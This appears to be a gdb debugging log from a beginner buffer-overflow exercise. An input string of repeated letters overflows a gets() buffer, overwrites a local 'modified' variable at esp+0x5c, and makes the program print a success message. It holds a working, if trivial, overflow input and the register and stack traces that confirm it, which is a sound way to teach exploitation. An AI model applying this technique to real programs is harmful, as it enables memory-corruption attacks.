## This is an example of success BOF, see the stack at offset `esp+0x5c` is being modified with `0x41414141`


0x804840c <main+24>:	call   0x804830c <gets@plt>
eax            0xbffff76c	-1073744020
ecx            0x137686b9	326534841
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x804840c	0x804840c <main+24>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0xb7eada75
0xbffff770:	0xb7fd7ff4	0x08049620	0xbffff788	0x080482e8
0xbffff780:	0xb7ff1040	0x08049620	0xbffff7b8	0x08048469
0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7b8
0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000

---

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAA
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
eax            0xbffff76c	-1073744020
ecx            0xbffff76c	-1073744020
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141

(check the `esp+0x5c` where we know it supposed to be overwritten)
(gdb) x/xw $esp+0x5c
0xbffff7ac:	0x41414141

---

(gdb) si
0x8048415 <main+33>:	test   eax,eax
eax            0x41414141	1094795585
ecx            0xbffff76c	-1073744020
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048415	0x8048415 <main+33>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141

---

(gdb) si
0x8048417 <main+35>:	je     0x8048427 <main+51>
eax            0x41414141	1094795585
ecx            0xbffff76c	-1073744020
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048417	0x8048417 <main+35>
eflags         0x200206	[ PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141

---

(gdb) 
eax            0x41414141	1094795585
ecx            0xbffff76c	-1073744020
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048419	0x8048419 <main+37>
eflags         0x200206	[ PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff7b0:	0x08048400	0x00000000	0xbffff838	0xb7eadc76
0x8048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x8048420 <main+44>:	call   0x804832c <puts@plt>

---

(gdb) 
you have changed the 'modified' variable
eax            0x29	41
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048425	0x8048425 <main+49>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0x08048500	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff7b0:	0x08048400	0x00000000	0xbffff838	0xb7eadc76
0x8048425 <main+49>:	jmp    0x8048433 <main+63>
0x8048427 <main+51>:	mov    DWORD PTR [esp],0x8048529

---

(gdb) 
eax            0x29	41
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x8048433	0x8048433 <main+63>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff750:	0x08048500	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff790:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff7a0:	0x46464646	0x47474747	0x48484848	0x41414141
0xbffff7b0:	0x08048400	0x00000000	0xbffff838	0xb7eadc76
0x8048433 <main+63>:	leave  
0x8048434 <main+64>:	ret    

---

(gdb) 
eax            0x29	41
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7bc	0xbffff7bc
ebp            0xbffff838	0xbffff838
esi            0x0	0
edi            0x0	0
eip            0x8048434	0x8048434 <main+64>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff7bc:	0xb7eadc76	0x00000001	0xbffff864	0xbffff86c
0xbffff7cc:	0xb7fe1848	0xbffff820	0xffffffff	0xb7ffeff4
0xbffff7dc:	0x0804824b	0x00000001	0xbffff820	0xb7ff0626
0xbffff7ec:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
0xbffff7fc:	0x00000000	0xbffff838	0x53ddf175	0x798a0765
0xbffff80c:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff81c:	0x08048340	0x00000000	0xb7ff6210	0xb7eadb9b
0x8048434 <main+64>:	ret    
0x8048435:	nop

---

(gdb) 
eax            0x29	41
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7c0	0xbffff7c0
ebp            0xbffff838	0xbffff838
esi            0x0	0
edi            0x0	0
eip            0xb7eadc76	0xb7eadc76 <__libc_start_main+230>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff7c0:	0x00000001	0xbffff864	0xbffff86c	0xb7fe1848
0xbffff7d0:	0xbffff820	0xffffffff	0xb7ffeff4	0x0804824b
0xbffff7e0:	0x00000001	0xbffff820	0xb7ff0626	0xb7fffab0
0xbffff7f0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffff800:	0xbffff838	0x53ddf175	0x798a0765	0x00000000
0xbffff810:	0x00000000	0x00000000	0x00000001	0x08048340
0xbffff820:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0xb7eadc76 <__libc_start_main+230>:	mov    DWORD PTR [esp],eax
0xb7eadc79 <__libc_start_main+233>:	call   0xb7ec60c0 <*__GI_exit>
__libc_start_main (main=0x80483f4 <main>, argc=1, ubp_av=0xbffff864, init=0x8048450 <__libc_csu_init>, 
    fini=0x8048440 <__libc_csu_fini>, rtld_fini=0xb7ff1040 <_dl_fini>, stack_end=0xbffff85c) at libc-start.c:260
260	libc-start.c: No such file or directory.
	in libc-start.c
